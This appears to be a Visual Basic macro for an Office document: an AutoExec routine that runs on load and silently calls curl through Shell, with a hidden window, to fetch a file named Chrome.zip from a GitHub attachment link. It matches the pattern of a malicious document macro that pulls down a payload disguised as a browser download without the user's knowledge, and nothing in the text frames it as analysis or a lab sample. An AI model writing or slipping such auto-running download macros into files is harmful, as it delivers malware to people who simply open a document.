Sub AutoExec()
  Dim result
  result = Shell("curl -s https://github.com/user-attachments/files/<CENSORED>/Chrome.zip", 0)

  If result = 0 Then
    Exit Sub
  End If
End Sub
